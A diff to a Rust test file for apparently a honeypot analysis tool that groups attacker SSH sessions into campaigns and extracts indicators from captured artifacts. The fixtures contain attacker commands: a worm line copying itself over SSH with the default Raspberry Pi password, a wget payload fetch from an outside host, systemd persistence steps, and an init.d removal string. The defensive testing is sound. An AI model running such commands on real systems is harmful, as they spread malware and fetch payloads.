@@ -206,8 +206,10 @@ async fn a_worm_sample_from_five_hosts_is_one_campaign_with_five_members(pool: P
 #[sqlx::test(migrations = false)]
 async fn sessions_differing_only_in_markers_and_addresses_group_and_others_do_not(pool: PgPool) {
     migrate(&pool).await;
-    let script = |ip: &str, marker: &str| -> Vec<String> {
-        vec![
+    // The script retries `cat > astats` a varying number of times (the owner saw three); the
+    // retries collapse, so the count does not split the campaign.
+    let script = |ip: &str, marker: &str, retries: usize| -> Vec<String> {
+        let mut commands = vec![
             "uname -s -v -n -r -m".to_string(),
             format!("echo {marker} > /tmp/.w && cat /tmp/.w && rm -f /tmp/.w"),
             "nproc".to_string(),
@@ -217,10 +219,9 @@ async fn sessions_differing_only_in_markers_and_addresses_group_and_others_do_no
             "cat > ~/.config/systemd/user/watcher-netai.service".to_string(),
             "systemctl --user enable watcher-netai.service".to_string(),
             "ps aux | grep astats | grep -v grep | wc -l".to_string(),
-            "cat > astats".to_string(),
-            "cat > astats".to_string(),
-            "cat > astats".to_string(),
-        ]
+        ];
+        commands.extend(std::iter::repeat_n("cat > astats".to_string(), retries));
+        commands
     };
     let campaign_ips = ["192.0.2.21", "192.0.2.22", "198.51.100.23"];
     let markers = [
@@ -231,7 +232,7 @@ async fn sessions_differing_only_in_markers_and_addresses_group_and_others_do_no
     for (n, (ip, marker)) in campaign_ips.iter().zip(markers).enumerate() {
         let session = Uuid::now_v7();
         let start = t0() + Duration::minutes(20 * n as i64);
-        for (i, c) in script(&format!("203.0.113.{}", 50 + n), marker)
+        for (i, c) in script(&format!("203.0.113.{}", 50 + n), marker, 3 - n)
             .iter()
             .enumerate()
         {
@@ -499,12 +500,14 @@ async fn indicators_carry_their_provenance(pool: PgPool) {
                 sshpass -praspberry scp $0 pi@$ip:/tmp/x\n";
     let worm_sha = sha_hex(worm.as_bytes());
     std::fs::write(spool.path().join(&worm_sha), worm).unwrap();
-    let binary_sha = sha_hex(b"\x7fELF\x02\x01\x01\0binary");
-    std::fs::write(
-        spool.path().join(&binary_sha),
-        b"\x7fELF\x02\x01\x01\0binary",
-    )
-    .unwrap();
+    // A compiled bot: its persistence template is found in its printable strings.
+    let bot: &[u8] = b"\x7fELF\x02\x01\x01\0\x8f\xc3rm -f /etc/init.d/%s\0\x90\x91";
+    let binary_sha = sha_hex(bot);
+    std::fs::write(spool.path().join(&binary_sha), bot).unwrap();
+    // A body with no printable run long enough to be a string.
+    let stripped: &[u8] = b"\x7fELF\x02\x01\x01\0\x8f\xc3ab\0\x90";
+    let stripped_sha = sha_hex(stripped);
+    std::fs::write(spool.path().join(&stripped_sha), stripped).unwrap();
     let missing_sha = sha_hex(b"never spooled");
 
     let session = Uuid::now_v7();
@@ -526,15 +529,32 @@ async fn indicators_carry_their_provenance(pool: PgPool) {
         "wget http://198.51.100.70:8080/kswpad",
     )
     .await;
-    for (i, sha) in [&worm_sha, &binary_sha, &missing_sha].iter().enumerate() {
+    for (i, sha) in [&worm_sha, &binary_sha, &stripped_sha, &missing_sha]
+        .iter()
+        .enumerate()
+    {
         upload(&pool, &format!("192.0.2.{}", 61 + i), t0(), sha, None).await;
     }
     index_all(&pool).await;
     let dirs: Vec<(&'static str, PathBuf)> = vec![("ssh", spool.path().to_path_buf())];
     let scanned = campaign::scan_artifacts(&pool, &dirs).await.unwrap();
     assert_eq!(
-        scanned, 2,
-        "the text and the binary body were found; the third was not"
+        scanned, 3,
+        "the text and both binary bodies were found; the fourth was not"
+    );
+    let from_binary: Vec<(String, String, String)> =
+        sqlx::query_as("SELECT kind, value, detail FROM ioc WHERE artifact_sha256 = $1")
+            .bind(&binary_sha)
+            .fetch_all(&pool)
+            .await
+            .unwrap();
+    assert_eq!(
+        from_binary,
+        vec![(
+            "persistence".to_string(),
+            "rm -f /etc/init.d/%s".to_string(),
+            "init.d".to_string()
+        )]
     );
 
     let rows = sqlx::query(
@@ -580,7 +600,8 @@ async fn indicators_carry_their_provenance(pool: PgPool) {
     .map(|(s, st, a)| (s, (st, a)))
     .collect();
     assert_eq!(states[&worm_sha].0, "done");
-    assert_eq!(states[&binary_sha].0, "not_text");
+    assert_eq!(states[&binary_sha].0, "done");
+    assert_eq!(states[&stripped_sha].0, "not_text");
     assert_eq!(
         states[&missing_sha],
         ("pending".to_string(), 1),
